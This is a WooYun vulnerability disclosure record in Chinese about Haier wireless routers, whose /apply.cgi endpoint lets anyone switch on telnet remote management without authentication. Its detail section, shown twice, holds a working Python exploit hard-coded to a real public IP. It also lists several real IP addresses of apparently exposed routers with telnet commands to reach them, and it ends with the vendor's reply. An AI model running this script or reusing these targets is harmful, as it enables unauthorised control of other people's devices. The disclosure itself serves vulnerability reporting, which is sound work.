{"id": 86021, "wybug_id": "wooyun-2016-0202756", "wybug_title": "WIFI安全之海尔无线路由器存在高危漏洞可直接控制设备", "wybug_corp": "海尔集团", "wybug_author": "路人甲", "wybug_date": "2016-04-27 22:28", "wybug_open_date": "2016-04-28 17:33", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： WIFI安全之海尔无线路由器存在高危漏洞可直接控制设备 详细说明：  该无线路由被大量使用，可通过该网站搜索：https://www.oshadan.com/main，关键字：Haier Wifi，可搜索到5000+\n\n经测试发现，该路由的/st_device.asp 文件有这样一个功能，如图：\n\n”启用 telnet远程管理“，打开这一选项，是不是就可以telnet了呢，试试选择该项，点击确定，然后执行：telnet xxx.xxx.xxx.xxx 23奇迹出现了，可直接登录设备，执行一系列的命令。便于测试，我简单写了一个python脚本，开通该功能：\nimport sysimport requests#url = sys.argv[1]url = 'http://124.152.236.162'if 'http' not in url: os._exit()url = \"{}/apply.cgi\".format(url)data = \"igmp_enable=0&upnp_enable=1&syslogd_enable=1&telnetd_enable=1&reboot_enable=0&submit_button=st_device&change_action=&action=Apply&upnpEn=on&remote_management=0&rtelnetd=0&syslogd=0&reboot_start_hour=0&reboot_start_min=0\"print '[*] Opening telnet ..'req = requests.post(url, data=data)if req.status_code == 200:    print '[*] Success ..'\n直接运行该脚本，即可开通telnet远程控制的功能。随机选择一些案例来进行漏洞证明：0x1 http://124.152.236.162telnet 124.152.236.162 23\n\n0x2 http://124.152.236.186telnet 124.152.236.186 23\n\n0x3 http://49.117.1.98/telnet 49.117.1.98 23\n\n再给出一些案例：\nhttp://49.117.1.98/http://124.152.236.186http://124.152.236.162http://72.130.248.15/http://77.35.7.104/\n   漏洞证明：  该无线路由被大量使用，可通过该网站搜索：https://www.oshadan.com/main，关键字：Haier Wifi，可搜索到5000+\n\n经测试发现，该路由的/st_device.asp 文件有这样一个功能，如图：\n\n”启用 telnet远程管理“，打开这一选项，是不是就可以telnet了呢，试试选择该项，点击确定，然后执行：telnet xxx.xxx.xxx.xxx 23奇迹出现了，可直接登录设备，执行一系列的命令。便于测试，我简单写了一个python脚本，开通该功能：\nimport sysimport requests#url = sys.argv[1]url = 'http://124.152.236.162'if 'http' not in url: os._exit()url = \"{}/apply.cgi\".format(url)data = \"igmp_enable=0&upnp_enable=1&syslogd_enable=1&telnetd_enable=1&reboot_enable=0&submit_button=st_device&change_action=&action=Apply&upnpEn=on&remote_management=0&rtelnetd=0&syslogd=0&reboot_start_hour=0&reboot_start_min=0\"print '[*] Opening telnet ..'req = requests.post(url, data=data)if req.status_code == 200:    print '[*] Success ..'\n直接运行该脚本，即可开通telnet远程控制的功能。随机选择一些案例来进行漏洞证明：0x1 http://124.152.236.162telnet 124.152.236.162 23\n\n0x2 http://124.152.236.186telnet 124.152.236.186 23\n\n0x3 http://49.117.1.98/telnet 49.117.1.98 23\n\n   修复方案：  加强权限验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-04-28 17:33 厂商回复：  最新状态： 2016-04-28：感谢白帽子的测试与提醒，该漏洞属于已知问题，WooYun-2016-196887，WooYun-2015-155274，并且最新版本5.9.4.3已经修正该问题。欢迎继续关注海尔安全，谢谢。  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}